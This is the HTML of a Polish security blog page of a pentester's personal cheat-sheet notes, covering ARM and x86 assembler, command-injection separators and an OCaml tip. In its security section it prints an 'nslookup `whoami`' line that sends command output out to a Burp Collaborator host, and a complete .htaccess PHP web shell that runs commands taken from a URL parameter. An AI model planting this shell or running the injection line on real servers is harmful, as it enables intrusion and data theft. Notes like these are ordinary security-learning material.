@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  
+    <title>Luźne notatki :: FoxtrotLabs — Tam gdzie bajty mówią dobranoc</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Zestaw &amp;ldquo;zawszetegozapominam&amp;rdquo;/&amp;ldquo;przydasie&amp;rdquo; - żeby nie szukać.
+Assembler x86 lea - load effective address
+lea eax, [ebp-4] ; wylicza wyrażenie i wrzuca do eax ARM assembler str - store word ldr - load word ; postfixy --h - half word &amp;lt;unsigned&amp;gt; --sh - half word &amp;lt;signed&amp;gt; --b - bajt &amp;lt;unsigned&amp;gt; --sb - bajt &amp;lt;signed&amp;gt; rejestry: R0-R10 ; {r0-r10} GPRS, rejestry ogólnego zastosowania R11 = FP ; Frame Pointer R12 = IP ; Intra Procedural Call, brak odpowiednika w x86 R13 = SP ; Stack pointer R14 = LR ; Link Register, tam trafia adres powrotu po wywołaniu funkcji &amp;lt;return address&amp;gt; R15 = PC ; Program Counter, w zalezności od stanu Thumb/ARM pokazuje current address &#43; 4/8." />
+<meta name="keywords" content="hacking" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://foxtrotlabs.cc/pl/notes/" />
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+<link rel="stylesheet" href="https://foxtrotlabs.cc/assets/style.css">
+
+  <link rel="stylesheet" href="assets/%25!s%28%3cnil%3e%29.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="pl" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Luźne notatki :: FoxtrotLabs">
+<meta property="og:description" content="Zestaw &amp;ldquo;zawszetegozapominam&amp;rdquo;/&amp;ldquo;przydasie&amp;rdquo; - żeby nie szukać.
+Assembler x86 lea - load effective address
+lea eax, [ebp-4] ; wylicza wyrażenie i wrzuca do eax ARM assembler str - store word ldr - load word ; postfixy --h - half word &amp;lt;unsigned&amp;gt; --sh - half word &amp;lt;signed&amp;gt; --b - bajt &amp;lt;unsigned&amp;gt; --sb - bajt &amp;lt;signed&amp;gt; rejestry: R0-R10 ; {r0-r10} GPRS, rejestry ogólnego zastosowania R11 = FP ; Frame Pointer R12 = IP ; Intra Procedural Call, brak odpowiednika w x86 R13 = SP ; Stack pointer R14 = LR ; Link Register, tam trafia adres powrotu po wywołaniu funkcji &amp;lt;return address&amp;gt; R15 = PC ; Program Counter, w zalezności od stanu Thumb/ARM pokazuje current address &#43; 4/8." />
+<meta property="og:url" content="https://foxtrotlabs.cc/pl/notes/" />
+<meta property="og:site_name" content="Luźne notatki" />
+
+  
+    <meta property="og:image" content="">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2017-08-26 22:39:38 &#43;0200 &#43;0200" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://foxtrotlabs.cc/pl">
+  <div class="logo">
+    foxtrotlabs-pl
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://foxtrotlabs.cc/pl/posts">posty</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/">English side</a></li>
+        
+      
+        
+          <li><a href="https://foxtrotlabs.cc/pl/about">o mnie</a></li>
+        
+      
+        
+          <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://foxtrotlabs.cc/pl/posts">posty</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/">English side</a></li>
+      
+    
+      
+        <li><a href="https://foxtrotlabs.cc/pl/about">o mnie</a></li>
+      
+    
+      
+        <li><a href="https://github.com/s3gm3nt4ti0nf4ult">github</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-148414315-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://foxtrotlabs.cc/pl/notes/">Luźne notatki</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2017-08-26 
+      </span>
+    
+    
+  </div>
+
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>Zestaw &ldquo;zawszetegozapominam&rdquo;/&ldquo;przydasie&rdquo; -  żeby nie szukać.</p>
+<h3 id="assembler-x86">Assembler x86<a href="#assembler-x86" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>lea</code> - load effective address</p>
+<pre><code>lea eax, [ebp-4]                ; wylicza wyrażenie i wrzuca do eax
+
+</code></pre><h3 id="arm-assembler">ARM assembler<a href="#arm-assembler" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<pre><code>str     - store word
+ldr     - load word
+; postfixy
+--h     - half word &lt;unsigned&gt;
+--sh    - half word &lt;signed&gt;
+--b     - bajt &lt;unsigned&gt;
+--sb    - bajt &lt;signed&gt;
+
+rejestry:
+R0-R10      ; {r0-r10} GPRS, rejestry ogólnego zastosowania
+R11 = FP    ; Frame Pointer
+R12 = IP    ; Intra Procedural Call, brak odpowiednika w x86
+R13 = SP    ; Stack pointer
+R14 = LR    ; Link Register, tam trafia adres powrotu po wywołaniu funkcji &lt;return address&gt;
+R15 = PC    ; Program Counter, w zalezności od stanu Thumb/ARM pokazuje current address + 4/8. Taki &quot;RIP/EIP&quot;.
+; ARM instr size = 4 bajty
+; Thumb (v1/v2)  = 2 bajty
+CPSR        ; EFAGS register, bardziej rozbudowany pod ARM, Current Program Status Register
+</code></pre><p>Thumb vs ARM:
+ARM intrukcje mają 32 bity. Thumb ma 16 bitów, Thumb v2 dodatkowo 32 bitowe instrukcje Thumb.</p>
+<p>32 bitowe instrukcje mają sufix <code>.w</code></p>
+<p>&ldquo;Barrel shifter&rdquo; - połączone instrukcje przesunięć bitowych z innymi instr. Mniejsza objętość kodu.</p>
+<pre><code>mov  R12, R1, LSL #2    ; R12 = (R1 &lt;&lt; 2) ; R12 = R1 * 4
+</code></pre><h3 id="os-command-injection">OS command injection<a href="#os-command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Najprostszy z błędów, łatwa exploitacja. Dane można eksfiltrować przez zapytania DNS (burpcollaborator), response aplikacji or zapis do pliku i następnie odwołanie się do niego.</p>
+<h5 id="separatory">Separatory:<a href="#separatory" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<ul>
+<li>|</li>
+<li>||</li>
+<li>&amp;</li>
+<li>&amp;&amp;</li>
+<li>; (unix)</li>
+<li>\n (unix)</li>
+</ul>
+<h5 id="injectowanie-komend-i-eksfiltracja-przez-burpcollaboratora">Injectowanie komend i eksfiltracja przez burpcollaboratora:<a href="#injectowanie-komend-i-eksfiltracja-przez-burpcollaboratora" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>Używanie <code>backticków</code> do wykonania shellowej komendy albo $(cmd):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup <span style="color:#e6db74">`</span>whoami<span style="color:#e6db74">`</span>.x.burpcollab
+</code></pre></div><h3 id="xss">XSS<a href="#xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h5 id="dom-based">DOM-based<a href="#dom-based" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<h5 id="reflected">Reflected<a href="#reflected" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<h5 id="stored">Stored<a href="#stored" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<h3 id="sqli">SQLI<a href="#sqli" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="bsqli">bSQLI<a href="#bsqli" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h5 id="eksfiltracja-danych-za-pomocą-requestów-dns">Eksfiltracja danych za pomocą requestów DNS<a href="#eksfiltracja-danych-za-pomocą-requestów-dns" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<h3 id="ssti">SSTI<a href="#ssti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="repl-ocamla">REPL Ocamla<a href="#repl-ocamla" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>UX przy wyjorzystaniu standardowego interpretera ocamla jest <em>cough</em> delikatnie mówiąc <em>cough</em> słaby. Fix:
+<code>rlwrap ocaml</code></p>
+<h3 id="htshell">Htshell:<a href="#htshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><a href="https://github.com/wireghoul/htshells">moar</a></p>
+<pre><code># &lt;!--  Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+
+# Override default deny rule to make .htaccess file accessible over web
+&lt;Files ~ &quot;^\.ht&quot;&gt;
+# Uncomment the line below for Apache2.4 and newer
+# Require all granted
+    Order allow,deny
+    Allow from all
+&lt;/Files&gt;
+
+# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
+# the apache directoves from the .htaccess file
+AddType application/x-httpd-php .htaccess
+
+###### SHELL ###### &lt;?php echo &quot;--&gt;&lt;form method='get'&gt;&lt;input type='text' name='c' value='&quot;.$_GET['c'].&quot;'&gt;&lt;input type='submit' name='go' value='Go!'&gt;&lt;/form&gt;\n&lt;pre&gt;&quot;;passthru($_GET['c'].&quot; 2&gt;&amp;1&quot;);echo &quot;&lt;/pre&gt;&quot;; ?&gt;
+</code></pre><h3 id="talkislajdyprezentacjesłowotoki">Talki/slajdy/prezentacje/słowotoki<a href="#talkislajdyprezentacjesłowotoki" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li><a href="https://foxtrotlabs.cc">LO VIII - Od CTFów do pentestingu</a> // ten o rozpoczęciu kariery w pentestingu</li>
+<li><a href="https://foxtrotlabs.cc">PP -s PUT Security Day - Cyberwarfare - CTFy czyli idziemy na strzelnicę</a> // ten o powiązaniach CTFów z cyberwojskiem</li>
+<li><a href="https://foxtrotlabs.cc">Poznan Security Meetup - Od zera (Thomasa) do Phineasa Phishera - czyli jak nie być pośmiewiskiem w świecie IT Sec</a> // ten o wykorzystaniu socjotechniki w Red Teamingu</li>
+<li><a href="https://docs.google.com/presentation/d/e/2PACX-1vSMXJiECa5tj-ViCWide4NDsBfok2b3afXdIY5EeqHl1OJXwmkp59dkPeIlyjSZv0httS1D0zd_7EgS/pub?start=false&amp;loop=false&amp;delayms=3000&amp;slide=id.p">PP - Erlang</a></li>
+</ol>
+
+      </div></div>
+
+  
+
+  
+
+<link rel="stylesheet" href="https://foxtrotlabs.cc/comments.css">
+ <section class="post-comments">
+  <script src='https://www.google.com/recaptcha/api.js'></script>
+  <h3>Comments</h3>
+
+  
+  
+  
+
+  
+    
+  
+
+  
+    <p>Nothing yet.</p>
+  
+
+  <h3>Say something</h3>
+
+  <form class="post-new-comment" method="POST" action="https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/s3gm3nt4ti0nf4ult.github.io/master/comments">
+  
+    <input type="hidden" name="options[redirect]" value="https://foxtrotlabs.cc/pl/notes/#comment-submitted">
+    <input type="hidden" name="options[entryId]" value="db235fc914867ffea6b540c8732499d5">
+    <input name="fields[name]" type="text" class="post-comment-field" placeholder="Your name">
+    <input name="fields[email]" type="email" class="post-comment-field" placeholder="Your email address">
+    <textarea name="fields[body]" class="post-comment-field" placeholder="Your message. Feel free to use Markdown." rows="10"></textarea>
+    <input type="hidden" name="options[reCaptcha][siteKey]" value="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR">
+    <input type="hidden" name="options[reCaptcha][secret]" value="LIrSDvvGlpdtRj5u1ERCiGLqhTgNVgs9kQoezb44tjrr83UiTbPCaem4CyKSxgXmkdI5CCOyheyPHa7PpZI7na9ZfI/RP4CYyHEj2TF2LdoVJ8ZclSuQiDw5h5SbgWNmKTOGODDwnEVQfy3dU0wZOKXYwUXqgKmW+wI49+Yz27DsHwe3UD+AclUnacU/A58F21iFPwcSaOkfxPz5Jz0mVk+8U25k/jO4LVAHB4/Uji6pBD9UT0H+9YzhsakPn5Cuak5FepB4+wxytndygr4X2YJSa+RMZCGBDqApqrinKRcDsq3CLmno8EfjJ4878iEaLeje4HAlgCjEdaY0GDBG7g==">
+    <div class="g-recaptcha" data-sitekey="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR"></div>
+    <input type="submit" class="post-comment-field btn" value="Submit">
+  </form>
+</section>
+
+<div id="comment-submitted" class="dialog">
+<h3>Thank you</h3>
+  <p>Your comment has been submitted and will be published once it has been approved.</p>
+  <p><a href="#" class="btn">OK</a></p>
+</div>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>copyright by foxtrot_charlie</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://foxtrotlabs.cc/assets/main.js"></script>
+<script src="https://foxtrotlabs.cc/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
